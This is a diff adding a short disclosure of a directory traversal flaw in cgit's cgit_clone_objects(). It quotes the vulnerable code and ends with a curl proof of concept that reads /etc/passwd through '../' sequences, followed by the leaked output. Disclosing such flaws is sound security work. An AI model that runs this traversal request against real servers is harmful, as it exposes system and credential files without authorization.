@@ -1,0 +1,25 @@
+There is a directory traversal vulnerability in cgit_clone_objects(), reachable when the configuration flag enable-http-clone is set to 1 (default):
+
+void cgit_clone_objects(void)
+{
+    if (!ctx.qry.path) {
+        cgit_print_error_page(400, "Bad request", "Bad request");
+        return;
+    }
+
+    if (!strcmp(ctx.qry.path, "info/packs")) {
+        print_pack_info();
+        return;
+    }
+
+    send_file(git_path("objects/%s", ctx.qry.path));
+}
+
+send_file() is a function that simply sends the data stored at the given filesystem path out over the network.
+git_path() partially rewrites the provided path and e.g. prepends the base path of the repository, but it does not sanitize the provided path to prevent directory traversal.
+
+ctx.qry.path can come from querystring_cb(), which takes unescaped data from the querystring. To trigger this case:
+
+$ curl http://127.0.0.1/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
